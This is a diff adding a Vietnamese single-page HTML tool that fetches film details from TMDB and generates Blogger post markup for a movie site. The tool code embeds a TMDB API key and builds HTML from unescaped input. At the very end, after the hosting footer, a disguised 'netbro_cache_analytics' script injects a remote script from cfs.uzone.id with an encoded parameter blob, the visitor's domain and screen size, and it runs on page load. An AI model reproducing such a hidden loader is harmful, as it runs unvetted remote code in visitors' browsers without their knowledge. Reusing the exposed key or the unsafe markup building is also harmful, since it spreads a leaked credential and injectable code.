@@ -1,0 +1,455 @@
+
+<!DOCTYPE html>
+<!--
+Source code của tool mở / không mã hóa sử dụng cho mục đích học tập. Vui lòng không sử dụng với mục đích thương mại.
+Code thuần js, nếu muốn up lên server chỉ cần copy hết source và dán sang file html.
+Template Blogger được chia sẽ trong nhóm VideoAPI.
+Update: 9/8/2017
+-->
+<head>
+<title>Tool Post v2</title>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<meta name="description" content="Tool hỗ trợ việc đăng phim trên Template Blogspot phim phát triền bởi Hoàng. Mẫu đăng phim được tạo theo v2."/>
+  <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Roboto:300,400,500,700">
+  <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/icon?family=Material+Icons">
+  <!-- Jquery -->
+  <script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js' type='text/javascript'></script>
+  <script src="https://cdn.rawgit.com/FezVrasta/dropdown.js/master/jquery.dropdown.js"></script>
+  <!-- Bootstrap -->
+  <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <!-- Bootstrap Material Design -->
+  <link rel="stylesheet" type="text/css" href="http://fezvrasta.github.io/bootstrap-material-design/dist/css/bootstrap-material-design.css">
+  <link href="//cdn.rawgit.com/FezVrasta/dropdown.js/master/jquery.dropdown.css" rel="stylesheet">
+  <link href="http://fezvrasta.github.io/bootstrap-material-design/dist/css/ripples.min.css" rel="stylesheet">
+  <script src="http://fezvrasta.github.io/bootstrap-material-design/dist/js/material.js"></script>
+	<script src="http://fezvrasta.github.io/bootstrap-material-design/dist/js/ripples.min.js"></script>
+<meta charset='UTF-8'/>
+	
+<style>
+
+
+/*Fix on hover / active */
+textarea:hover, 
+input:hover, 
+textarea:active, 
+input:active, 
+textarea:focus, 
+input:focus,
+button:focus,
+button:active,
+button:hover,
+label:focus,
+.btn:active,
+.btn.active
+{
+    outline:0px !important;
+    -webkit-appearance:none!important;
+	box-shadow: none!important;
+-moz-box-shadow: none!important;
+-webkit-box-shadow: none!important;
+}
+
+/* Main */
+body { background: #EEEEEE; color: #333; font-size: 16px;     line-height: 1.42857143;}
+header {
+    height: 144px;
+    position: relative;
+	background-color: #009587;
+	z-index: 3;
+}
+header h1 { 
+    color: #fff; 
+	text-align: center; 
+    position: absolute;
+    bottom: 10px;
+    padding-left: 35px;
+}
+footer {
+    height: 90px;
+    position: relative;
+	background-color: #26a69a;
+	z-index: 3;
+}
+footer span {
+	position:absolute;
+	bottom:10px;
+	right: 10px;
+	color: rgba(255,255,255,.55);
+}
+h4 {
+color: #607D8B;
+}
+h3 {
+text-align:center;
+font-weight:bold;
+color: rgb(82, 101, 162);
+}
+label {
+color: #009688;
+}
+#ketqua-output {
+    font-family: Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+	color: #2f6f9f; width: 100%;
+	overflow:hidden;
+	resize: none;
+}
+#btnsubmit {
+display:block;
+}
+#baidang-meta h5 {
+color: #ff5722;
+display: inline-block;
+    font-size: 16px;
+}
+</style>
+
+<script>
+function showmodal(head,text) {
+	if ($('.modal').length == 0) $('body').append('<div style="display:block;" class="modal"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button><h4 class="modal-title">'+head+'</h4></div><div class="modal-body"><p>'+text+'</p></div><div class="modal-footer"><button type="button" class="btn btn-default" data-dismiss="modal">Đóng</button></div></div></div></div>');
+	//Dialog modal
+$("button[data-dismiss='modal']").click(function(){
+	$(".modal").remove();
+})
+}
+
+function submit() {
+if ($("#namevi").val() && $("#name").val() && $("#desc").val() && $('#backdrop').val() && $('#poster').val() && $('#trailer').val() && $('#status').val() && $('#imdb').val() && $('#genre').val() && $('#country').val() && $('#year').val() && $('#actor').val() && $('#director').val() && $('#duration').val()) 	 
+	{
+	
+	var result = '<img src="'+$('#poster').val()+'" id="mvi-thumb-data"/>\n<img src="'+$('#backdrop').val()+'" id="mvi-cover-data"/>\n<div id="mvi-status-data">['+$('#status').val()+']</div>\n<!--more-->\n<div id="mvi-desc-data">'+$('#desc').val()+'</div>\n<div id="imdb-tt">'+$("#imdb").val()+'</div>\n<div id="mvi-genre-data">'+$("#genre").val()+'</div>\n<div id="mvi-actor-data">'+$("#actor").val()+'</div>\n<div id="mvi-director-data">'+$("#director").val()+'</div>\n<div id="mvi-country-data">'+$("#country").val()+'</div>\n<div id="mvi-duration-data">'+$("#duration").val()+'</div>\n<div id="mvi-res-data">'+$("#quality").val()+'</div>\n<div id="mvi-year-data">'+$("#year").val()+'</div>\n<div id="mvi-trailer-data">'+$("#trailer").val()+'</div>\n<div id="mvi-link-data">\n';
+	var x,a;
+	$( ".epsx" ).each(function() {
+	  x = $(this).val();
+	  a = x.split("|");
+	  if (a[0].indexOf('drive.google.com/drive/folders/') > 0) result += '<id data-src="'+a[0]+'" t="f"></id>\n';
+	  else result += '<id data-src="'+a[0]+'">'+a[1]+'</id>\n';
+	});
+	result += '</div>\n';
+	
+	if ($("#othermedia").val()) {
+		result += '<div id="mvi-othermedia-data">'+$("#othermedia").val()+'</div>';
+	}
+	
+	$("#ketqua-output").val(result);
+	document.getElementById("ketqua-output").style.height = (document.getElementById("ketqua-output").scrollHeight)+"px";
+	$("#baidang-title").html($('#namevi').val()+' - '+$('#name').val()+' ('+$('#year').val()+')');
+	$("#baidang-tag").html($('#namevi').val()+', '+$('#name').val()+', '+$('#country').val()+', '+$('#genre').val()+', ');
+	var crew_x = ($("#actor").val()+', '+$("#director").val()).split(', ');
+	for (i in crew_x) {
+		var kk = crew_x[i].split('_');
+		$("#baidang-tag").append(kk[0]+'_'+kk[1]+', ');
+	}
+	if ($("#type").val() == 'Phim bộ') $("#baidang-tag").append('Phim bộ');
+	if ($("#type").val() == 'Phim lẻ') $("#baidang-tag").append('Phim lẻ');
+	if ($("#dangchieu").attr('checked')) $("#baidang-tag").append(', Đang chiếu');
+	if ($("#chieurap").attr('checked')) $("#baidang-tag").append(', Chiếu rạp');
+	$("#baidang-date").html(date[2]+'/'+date[1]+'/'+date[0]);
+	}
+else { showmodal('Lỗi khi tạo Post phim','Một trong những trường ở trên chưa được nhập. Vui lòng kiểm tra lại')}
+}
+function gettmdb(i) {
+	if ($("#tmdb").val() == "") showmodal("Lỗi","Bạn chưa nhập tmdb ID");
+	else {
+	if (i==0) showmodal("Đây là phim lẻ hay phim bộ?",'<div onclick="gettmdb(1)" class="btn btn-default">Phim lẻ</div><div onclick="gettmdb(2)" class="btn btn-default">Phim bộ</div>');
+	if (i==1) { $(".modal").remove(); getmv($("#tmdb").val()); }
+	if (i==2) { $(".modal").remove(); gettv($("#tmdb").val()); }
+	}
+}
+var apikey = "b9c00d6dffc692bd993af6d00f747ade";
+function gettvss(ss) {
+	for (i in data.seasons) {
+		if (ss == data.seasons[i].season_number) {
+			if (data.seasons[i].poster_path) $("#poster").val("https://image.tmdb.org/t/p/w500"+data.seasons[i].poster_path);
+			window.date = data.seasons[i].air_date.split('-');
+			$('#year').val(date[0]);
+		}
+	}
+	$(".modal").remove();
+}
+function gettv(id) {
+	$("#type").val("Phim bộ");
+	$.ajax({
+	url: "https://api.themoviedb.org/3/tv/"+id+"?api_key="+apikey+"&append_to_response=videos,credits,external_ids&language=en-US",
+	dataType: "json",
+	success: function(json){
+	window.data = json;
+		iserror = false;
+        try {  $("#name").val(data.name); } catch(e) {  iserror = true; }
+		try { $("#desc").val(data.overview); } catch(e) {  iserror = true; }
+		try { $("#backdrop").val("https://image.tmdb.org/t/p/original"+data.backdrop_path); } catch(e) {  iserror = true; }
+		try { $("#poster").val("https://image.tmdb.org/t/p/w500"+data.poster_path); } catch(e) {  iserror = true; }
+		for (i in data.videos.results) {
+			if (data.videos.results[i].type == "Trailer") { 
+				if (data.videos.results[i].site == "YouTube") { 
+				$("#trailer").val("https://www.youtube.com/watch?v="+data.videos.results[i].key)
+				break;
+				}
+			}
+			if (data.videos.results[i].type == "Teaser") { 
+				if (data.videos.results[i].site == "YouTube") { 
+				$("#trailer").val("https://www.youtube.com/watch?v="+data.videos.results[i].key)
+				}
+			}
+			if (i == data.videos.results.length - 1 && $("#trailer").val() == "") {
+				if (data.videos.results[0].site == "YouTube") { 
+				$("#trailer").val("https://www.youtube.com/watch?v="+data.videos.results[0].key)
+				}
+			}
+		}
+		try { $("#imdb").val(data.external_ids.imdb_id); } catch(e) {  iserror = true; }
+		try { for (i in data.genres) {
+			$('#genre').val($('#genre').val() + 'tl_' + data.genres[i].name);
+			if (i < 2) $('#genre').val($('#genre').val() + ', ');
+			if (i == 2) break;
+		}
+		} catch(e) {  iserror = true; }
+				//update tiếng việt
+		$("#genre").val($("#genre").val().replace("Action","Hành động").replace("Comedy","Hài hước").replace("Family","Gia đình").replace("History","Lịch sử").replace("Mystery","Bí ẩn").replace("Sci-Fi","Khoa học viễn tưởng").replace("War","Chiến tranh").replace("Adventure","Phiêu lưu").replace("Crime","Tội phạm").replace("Fantasy","Thần thoại").replace("Horror","Kinh dị").replace("News","Tin tức").replace("Sport","Thể thao").replace("Animation","Hoạt hình").replace("Documentary","Tài liệu").replace("Music","Âm nhạc").replace("Reality-TV","Chương trình thực tế").replace("Biography","Tiểu sử").replace("Drama","Hài kịch").replace("Musical","Nhạc kịch").replace("Romance","Lãng mạn").replace("Thriller","Gây cấn"));
+		try { $('#country').val('qg_' + data.origin_country[0]); } catch(e) {  iserror = true; }
+
+		try { for (i in data.credits.cast) {
+			$('#actor').val($('#actor').val() + 'pp_' + data.credits.cast[i].id + '_' + data.credits.cast[i].name);
+			if (i < 2) $('#actor').val($('#actor').val() + ', ');
+			if (i == 2) break;
+		}} catch(e) {  iserror = true; }
+		try { $("#director").val('pp_'+data.created_by[0].id+'_'+data.created_by[0].name); } catch(e) {  iserror = true; }
+	    $('label[for=director]').html("Sáng lập");
+		try { $("#duration").val(data.episode_run_time+ ' phút');} catch(e) {  iserror = true; }
+		var sshtml = "";
+		for (i in data.seasons) {
+			sshtml += '<div class="btn btn-default" onclick="gettvss('+data.seasons[i].season_number+')">Mùa '+data.seasons[i].season_number+'</div>';
+		}	
+		sshtml += '<a class="btn btn-default" target="_blank" href="https://www.themoviedb.org/tv/'+id+'/seasons">Tôi không biết đây là mùa mấy</a>';
+		$("#tool-box").fadeIn();
+		$("#tmdb-input").fadeOut();
+		showmodal("Đây là mùa mấy?",sshtml);
+    }});
+}
+function getmv(id) {
+	$("#type").val("Phim lẻ");
+	$.ajax({
+	url: "https://api.themoviedb.org/3/movie/"+id+"?api_key="+apikey+"&append_to_response=videos,credits&language=en-US",
+	dataType: "json",
+	success: function(json){
+	window.data = json;
+		iserror = false;
+        try { $("#name").val(data.title);  } catch(e) {  iserror = true; }
+		try { $("#desc").val(data.overview);  } catch(e) {  iserror = true; }
+		try { $("#backdrop").val("https://image.tmdb.org/t/p/original"+data.backdrop_path); } catch(e) {  iserror = true; }
+		try { $("#poster").val("https://image.tmdb.org/t/p/w500"+data.poster_path);  } catch(e) {  iserror = true; }
+		for (i in data.videos.results) {
+		
+			if (data.videos.results[i].type == "Trailer") { 
+				if (data.videos.results[i].site == "YouTube") { 
+				$("#trailer").val("https://www.youtube.com/watch?v="+data.videos.results[i].key)
+				break;
+				}
+			}
+			if (data.videos.results[i].type == "Teaser") { 
+				if (data.videos.results[i].site == "YouTube") { 
+				$("#trailer").val("https://www.youtube.com/watch?v="+data.videos.results[i].key)
+				}
+			}
+			if (i == data.videos.results.length - 1 && $("#trailer").val() == "") {
+				if (data.videos.results[0].site == "YouTube") { 
+				$("#trailer").val("https://www.youtube.com/watch?v="+data.videos.results[0].key)
+				}
+			}
+		}
+		try { $("#imdb").val(data.imdb_id); } catch(e) {  iserror = true; }
+		for (i in data.genres) {
+			$('#genre').val($('#genre').val() + 'tl_' + data.genres[i].name);
+			if (i < 2) $('#genre').val($('#genre').val() + ', ');
+			if (i == 2) break;
+		}
+				//update tiếng việt
+		$("#genre").val($("#genre").val().replace("Action","Hành động").replace("Comedy","Hài hước").replace("Family","Gia đình").replace("History","Lịch sử").replace("Mystery","Bí ẩn").replace("Sci-Fi","Khoa học viễn tưởng").replace("War","Chiến tranh").replace("Adventure","Phiêu lưu").replace("Crime","Tội phạm").replace("Fantasy","Thần thoại").replace("Horror","Kinh dị").replace("News","Tin tức").replace("Sport","Thể thao").replace("Animation","Hoạt hình").replace("Documentary","Tài liệu").replace("Music","Âm nhạc").replace("Reality-TV","Chương trình thực tế").replace("Biography","Tiểu sử").replace("Drama","Hài kịch").replace("Musical","Nhạc kịch").replace("Romance","Lãng mạn").replace("Thriller","Gây cấn"));
+		try { $('#country').val('qg_'+data.production_countries[0].iso_3166_1);} catch(e) {  iserror = true; }
+		window.date = data.release_date.split('-');
+		$('#year').val(date[0]);
+		try { for (i in data.credits.cast) {
+			$('#actor').val($('#actor').val() + 'pp_'+ data.credits.cast[i].id+'_'+data.credits.cast[i].name);
+			if (i < 2) $('#actor').val($('#actor').val() + ', ');
+			if (i == 2) break;
+		} } catch(e) {  iserror = true; }
+		try { $("#director").val('pp_'+data.credits.crew[0].id+'_'+data.credits.crew[0].name); } catch(e) {  iserror = true; }
+		try { $("#duration").val(data.runtime+' phút'); } catch(e) {  iserror = true; }
+		
+		$("#tool-box").fadeIn();
+		$("#tmdb-input").fadeOut();
+	}});
+}
+
+//Init material bootstrap
+$( document ).ready(function() {
+    $.material.init();
+	$("select").dropdown({ "autoinit" : "select" });
+});
+</script>
+
+</head>
+<body>
+<header>
+<h1>Tool Post phim cho template v2</h1>
+</header>
+<div id="tmdb-input" style="margin-top: 10px;" class="container">
+<h5>Để bắt đầu hãy nhập Mã tMDb</h5>
+	<form class="form-inline">
+			<div class="form-group is-empty">
+			<label for="image">Mã tMDb</label>
+			<input class="form-control" id="tmdb">
+			<span class="help-block">Xem hướng dẫn lấy mã ở phía dưới</span>
+
+			</div>
+			<div id="gettMDB" class="btn btn-primary" onclick="gettmdb(0)">Get INFO<div class="ripple-container"></div></div>
+</form>
+</div>
+<div id="tool-box" style="margin-top: 10px; display:none;" class="container">
+	<div class="row">
+		<div class="col-md-6">
+		<h4>Phim</h4>
+		<form>
+		  <div class="form-group">
+			<label for="namevi">Tên phim (Tiếng Việt)</label>
+			<input class="form-control" id="namevi">
+		  </div>
+		  <div class="form-group">
+			<label for="name">Tên phim (Tiếng Anh)</label>
+			<input class="form-control" id="name">
+		  </div>
+		  <div class="form-group">
+			<label for="desc">Nội dung phim</label>
+			<textarea style="resize: none;" id="desc" class="form-control" rows="3"></textarea>
+		  </div>
+		  <div class="form-group">
+			<label for="image">Ảnh phim (ảnh nền)</label>
+			<input type="url" class="form-control" id="backdrop">
+		  </div>
+		  <div class="form-group">
+			<label for="poster">Poster phim (Áp phích)</label>
+			<input type="url" class="form-control" id="poster">
+		  </div>
+		  <div class="form-group">
+			<label for="trailer">Trailer</label>
+			<input type="url" class="form-control" id="trailer">
+		  </div>
+		  <div style="display:none;" class="form-group">
+		  <label for="type">Đây là phim lẻ hay phim bộ</label>
+			<select id="type" class="form-control">
+			  <option value="Phim lẻ">Phim lẻ</option>
+			  <option value="Phim bộ">Phim bộ</option>
+			</select>
+		  </div>
+		  <div class="form-group">
+			<label for="trailer">Trạng thái</label>
+			<input class="form-control" id="status">
+		  </div>
+		  <div class="form-group" style='margin-top: 0;'>
+		  Đây cũng là
+			<div class="checkbox">
+			  <label>
+				<input type="checkbox" id='chieurap'> Phim chiếu rạp
+			  </label>
+			  <label>
+				<input type="checkbox" id='dangchieu'> Phim đang chiếu
+			  </label>
+			</div>
+		  </div>
+		</form>
+		</div>
+		<div class="col-md-6">
+		<h4>Thông tin chi tiết</h4>
+			<form class="form-inline">
+				<div class="form-group">
+				<label for="image">Mã iMDb</label>
+				<input class="form-control" id="imdb">
+				</div>
+				
+			</form>
+			<form>
+				  <div class="form-group">
+					<label for="genre">Thể loại</label>
+					<input class="form-control" id="genre" placeholder="tl_tên">
+				  </div>
+				  <div class="form-group">
+					<label for="country">Quốc gia</label>
+					<input class="form-control" id="country" placeholder="qg_tên">
+				  </div>
+				  <div class="form-group">
+					<label for="year">Năm ra mắt</label>
+					<input class="form-control" id="year">
+				  </div>
+				  <div class="form-group">
+					<label for="actor">Diễn viên</label>
+					<input class="form-control" id="actor" placeholder="pp_tmdbid_tên">
+				  </div>
+				  <div class="form-group">
+					<label for="director">Đạo diễn</label>
+					<input class="form-control" id="director" placeholder="pp_tmdbid_tên">
+				  </div>
+				  <div class="form-group">
+					<label for="duration">Thời lượng</label>
+					<input class="form-control" id="duration">
+				  </div>
+				  <div class="form-group">
+					<label for="quality">Chất lượng</label>
+					<select id="quality" class="form-control">
+					  <option>Full HD</option>
+					  <option>HD</option>
+					  <option>SD 480p</option>
+					  <option>320p</option>
+					</select>
+				  </div>
+		  </form>
+		</div>
+		
+	</div>
+    <div class="form-group">
+		<label for="othermedia">Video và hình ảnh khác</label>
+		<textarea style="resize: none;" id="othermedia" class="form-control" rows="3"></textarea>
+		<span class="help-block">Ngăn cách bằng dấu ";" | Sử dụng link Youtube | Sử dụng hình ảnh với link trực tiếp (.jpg, .png,...)</span>
+	</div>
+   <div id="sourcemvi" style="margin-top: 10px;">
+   <h4 style='display: inline-block;'>Source</h4> <div class="btn btn-info " onclick="addsource()">Thêm tập</div>
+   <div id="epsadd" class="form-group"> 
+   </div>
+
+   <script>
+function addsource() {
+var nosource='eps' + $(".epsx").length;
+$("#epsadd").append('<input class=" epsx form-control eps" placeholder="linkphim.mp4|Tập 69" id="'+nosource+'"></input><div data-src="'+nosource+'" class="btn-deleps btn btn-danger ">Xóa</div>')
+$(".btn-deleps").click(function(){
+	$('#'+$(this).attr('data-src')).remove();
+	$(this).remove();
+});
+
+}
+</script>
+	</div>
+  <div id="btnsubmit" onclick="submit()" class="btn btn-raised btn-primary">Tạo</div>
+<p class="text-danger">Hãy chắc chắn rằng tất cả các thông tin đã được nhập.</p>
+</div> 
+<div class="container">
+  <div id="ketqua" style="">
+  <h3>Kết quả</h3>
+	<fieldset disabled><textarea id="ketqua-output"></textarea></fieldset>
+	<div id="baidang-meta">
+		<h5><i class="fa fa-header" aria-hidden="true"></i> Tiêu đề bài đăng:</h5> <span id="baidang-title"></span><br/>
+		<h5><i class="fa fa-tag" aria-hidden="true"></i> Nhãn:</h5> <span id="baidang-tag"></span><br/>
+		<h5><i class="fa fa-clock-o" aria-hidden="true"></i> Lịch biểu (Đặt ngày và giờ):</h5> <span id="baidang-date"></span><br/>
+	</div>
+  </div>  
+   <div id="cachpost" style="margin-top:10px;">
+	<h3>Hướng dẫn</h3>
+	<h5>Cách lấy mã tMDB</h5>
+	<p>Để lấy mã tMDB, truy cập vào website <a rel='nofollow' href="https://www.themoviedb.org/">https://www.themoviedb.org</a> và tìm chọn bộ phim. Nhìn trên thanh địa chỉ web sẽ thấy một như sau: <i>https://www.themoviedb.org/movie/<span style='color:#f44336;'>166426</span>-pirates-of-the-caribbean-dead-men-tell-no-tales</i>. Copy đoạn mã và dán vào trường <span style='color: #009688;'>Mã tMDb</span> sau đó nhấn <span style='color: #009688;'>GET INFO</span>.</p>
+	<h5>Cách đăng phim</h5>
+	<p>Sau khi điền đầy đủ các thông tin trên phần <span style='color: #009688;'>Tool</span>, nhấn <span style='color: #009688;'>Tạo</span>. 
+	Tạo một bài đăng mới trên blogger.com và chuyển qua tab HTML sau đó chép đoạn mã trong khung kết quả vào. Hãy nhớ đặt chính sát Tiêu đề, nhãn, Ngày đăng, Mô tả tìm kiếm...</p>
+	</div>  
+ </div>
+ <footer>
+	<span>Developed by <a href='https://www.facebook.com/vvhoang2002' style='color:#fff;'>Hoàng</a></span>
+ </footer>
+  <div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;'><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website_{$app['name']}&amp;utm_content=footer_img"><img src="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"  alt="www.000webhost.com"></a></div><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31sbeNp8z%2fOJmfXHcz%2bIF7utKnth64yGXlvIQU9VCy8Cvx2Swb5bGIhZFardtYrKZMzhAZ6YYVcx7RRPjIYU%2buy5wYySwABMpxUV8F4yg%2f8a8v3jLwGG6XbmsHhCYSsJMPnmhIzvBeYZGy0S1t7xHpSCWP%2f71fYzDOPCUzAq5VQDrFTUkqPBuKCrQyTSo2c3zVPjp0K%2fJFHOV7xx4Dh8iQOcdYNj7b5z%2fQl%2fD%2fybbk%2frZaSDNS9U9dHCDNVUPCuLt8EAC16SzYEAHzSZJxDzz1Cgs6mkcSHaMPWRxBbxLQJl9J%2faQ6k6COC25ZxWfodUpDv%2beclTWCBn7fbtdTwaWvn4%2fdoZkxfKeovWfMNot374clQuOKfiYRqP01Kj7NYY9ICloj6LZ6ZDfgvbaVHmhQuzXaGYMuPoSbHk9BIEVz339Dp5po1cU0PdwaEDF6jGc%2bZeI0UF9JCKkMTL9Rn3wt5wBWh4GdE94kfKGfnh1yTEmdCRIoHb7JfhvtYst7Rj2PjT0hSGrQ%2b%2fzpligsvuNn2SS5M3VzlVgujlWcqJ1Z3gakyfPggIfb%2fc2O1umTbRlayLytG6UjpQI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
